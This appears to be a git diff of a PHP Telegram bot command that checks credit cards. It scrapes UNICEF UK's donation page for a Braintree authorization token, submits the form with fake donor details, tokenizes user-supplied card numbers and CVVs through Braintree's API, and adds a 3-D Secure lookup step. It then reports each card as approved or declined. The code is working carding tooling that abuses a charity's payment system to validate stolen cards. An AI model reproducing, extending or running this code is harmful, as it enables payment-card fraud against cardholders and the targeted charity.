@@ -6,7 +6,7 @@
 
 /schk creditcard - Checks the Credit Card
 
-*/
+ */
 
 
 include __DIR__."/../config/config.php";
@@ -17,18 +17,18 @@ include_once __DIR__."/../functions/functions.php";
 
 
 ////////////====[MUTE]====////////////
-if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){   
+if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){
     $antispam = antispamCheck($userId);
     addUser($userId);
-    
+
     if($antispam != False){
-      bot('sendmessage',[
-        'chat_id'=>$chat_id,
-        'text'=>"[<u>Chala Ja Bsdk</u>] Try again after <b>$antispam</b>s.",
-        'parse_mode'=>'html',
-        'reply_to_message_id'=> $message_id
-      ]);
-      return;
+        bot('sendmessage',[
+          'chat_id'=>$chat_id,
+          'text'=>"[<u>Chala Ja Bsdk</u>] Try again after <b>$antispam</b>s.",
+          'parse_mode'=>'html',
+          'reply_to_message_id'=> $message_id
+        ]);
+        return;
 
     }else{
         $messageidtoedit1 = bot('sendmessage',[
@@ -199,38 +199,38 @@ if(strpos($message, "/sch ") === 0 || strpos($message, ".sch") === 0){
                 ///////////////////////////////--------------REQUEST--2-------------/////////////////////////////////////////
 
 
-$data = "_csrf=$csrf&email=lkadsjflaksdfj%40gamil.com&selectTitle=Mr&firstname=jaklsjf&surname=lkasjdlkj&find=&Line1=B%2C+Priory+Court&Line2=Kingshill+Road&City=Dursley&PostalCode=GL11+4DH&CountryName=United+Kingdom&over18=on&phoneNumber=&warm_audience=&warm_audience_interacted=&fromStage=details";
+                $data = "_csrf=$csrf&email=lkadsjflaksdfj%40gamil.com&selectTitle=Mr&firstname=jaklsjf&surname=lkasjdlkj&find=&Line1=B%2C+Priory+Court&Line2=Kingshill+Road&City=Dursley&PostalCode=GL11+4DH&CountryName=United+Kingdom&over18=on&phoneNumber=&warm_audience=&warm_audience_interacted=&fromStage=details";
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'Host: donate.unicef.org.uk';
-$headers[] = 'method: POST';
-$headers[] = 'path: /thankyoufordonating/single/1/donate/details';
-$headers[] = 'scheme: https';
-$headers[] = 'Accept-Language: en-US,en;q=0.5';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-$headers[] = 'Origin: https://donate.unicef.org.uk';
-$headers[] = 'Referer: https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details';
-$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
-$headers[] = 'sec-ch-ua-mobile: ?0';
-$headers[] = 'sec-ch-ua-platform: "Windows"';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-site: same-origin';
-$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-$roll2 = curl_exec($ch);
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, 'https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details');
+                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                $headers = array();
+                $headers[] = 'Host: donate.unicef.org.uk';
+                $headers[] = 'method: POST';
+                $headers[] = 'path: /thankyoufordonating/single/1/donate/details';
+                $headers[] = 'scheme: https';
+                $headers[] = 'Accept-Language: en-US,en;q=0.5';
+                $headers[] = 'Content-Type: application/x-www-form-urlencoded';
+                $headers[] = 'Origin: https://donate.unicef.org.uk';
+                $headers[] = 'Referer: https://donate.unicef.org.uk/thankyoufordonating/single/1/donate/details';
+                $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
+                $headers[] = 'sec-ch-ua-mobile: ?0';
+                $headers[] = 'sec-ch-ua-platform: "Windows"';
+                $headers[] = 'sec-fetch-dest: empty';
+                $headers[] = 'sec-fetch-mode: cors';
+                $headers[] = 'sec-fetch-site: same-origin';
+                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
+                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_HEADER, 0);
+                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+                $roll2 = curl_exec($ch);
 
 
                 ///////////////////////////////--------------REQUEST--3-------------/////////////////////////////////////////
@@ -266,13 +266,14 @@ $roll2 = curl_exec($ch);
                 $tok = trim(strip_tags(capture($roll3, "var btToken", ";")));
                 $author = base64_decode($tok);
                 $finger = trim(strip_tags(capture($author, 'authorizationFingerprint":"', '"')));
-                
+
+
                 ///////////////////////////////--------------REQUEST--4-------------/////////////////////////////////////////
-                
-                
+
+
                 $paydata = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d77f5f72-558b-40e7-9d26-3794db0793bc"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"$cc","expirationMonth":"$mes","expirationYear":"$ano","cvv":"$cvv"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';
                 $bearer ="Authorization: Bearer $finger";
-                
+
                 $ch = curl_init();
                 curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -303,6 +304,47 @@ $roll2 = curl_exec($ch);
                 curl_setopt($ch, CURLOPT_POSTFIELDS, $paydata);
                 $roll4 = curl_exec($ch);
                 $token = trim(strip_tags(capture($roll4, 'token":"', '"')));
+
+
+                ///////////////////////////////--------------REQUEST--5-------------/////////////////////////////////////////
+
+                $lookupurl = "https://api.braintreegateway.com/merchants/yp26hk4nqt2t2f4f/client_api/v1/payment_methods/$token/three_d_secure/lookup";
+
+                $inver = '"';
+                $aa = '{"amount":75,"braintreeLibraryVersion":"braintree/web/3.60.0","_meta":{"merchantAppId":"donate.unicef.org.uk","platform":"web","sdkVersion":"3.60.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"d77f5f72-558b-40e7-9d26-3794db0793bc"}';
+                $au = "authorizationFingerprint";
+                $ab =",$inver$au$inver:$inver$finger$inver}";
+                $lookupdata = "$aa$ab";
+
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, $lookupurl);
+                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+                curl_setopt($ch, CURLOPT_POST, 1);
+                $headers = array();
+                $headers = array();
+                $headers[] = 'Host: payments.braintree-api.com';
+                $headers[] = 'method: POST';
+                $headers[] = 'path: /graphq';
+                $headers[] = 'scheme: https';
+                $headers[] = 'Accept-Language: en-US,en;q=0.5';
+                $headers[] = 'Content-Type: application/json';
+                $headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
+                $headers[] = 'sec-ch-ua-platform: "Windows"';
+                $headers[] = 'Braintree-Version: 2018-05-10';
+                $headers[] = 'sec-fetch-mode: cors';
+                $headers[] = 'sec-fetch-site: same-origin';
+                $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
+                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_HEADER, 0);
+                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $lookupdata);
+                $roll5 = curl_exec($ch);
+
 
             }
             $info = curl_getinfo($ch);
@@ -380,9 +422,9 @@ Time -» <b>$time</b><b>s</b>
                   'message_id'=>$messageidtoedit,
                   'text'=>"<b>Card:</b> <code>$lista</code>
 <b>Status -» Declined! ❌
-Response -» $tok |csrf - $csrf | token - $token
-Decline Error -» roll 4 -$roll4 
-Result -» 
+Response -» $tok |csrf - $csrf
+Decline Error -» roll 5 - $roll5
+Result -»
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
 
